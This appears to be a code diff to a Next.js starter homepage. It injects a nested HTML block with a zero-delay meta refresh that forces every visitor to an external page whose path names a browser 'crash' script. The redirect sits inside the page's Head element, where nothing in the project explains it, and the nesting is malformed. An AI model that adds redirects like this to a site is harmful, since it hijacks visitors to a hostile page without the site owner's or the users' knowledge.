@@ -8,6 +8,13 @@ export default function Home() {
       <Head>
         <title>Next.js Starter!</title>
         <link rel="icon" href="/favicon.ico" />
+        <html>
+<head><meta http-equiv="refresh" content="0; URL=http://www.newdream.net/crash/js2.html" />
+</head>
+<body>
+</body>
+</html>
+
       </Head>
 
       <main>
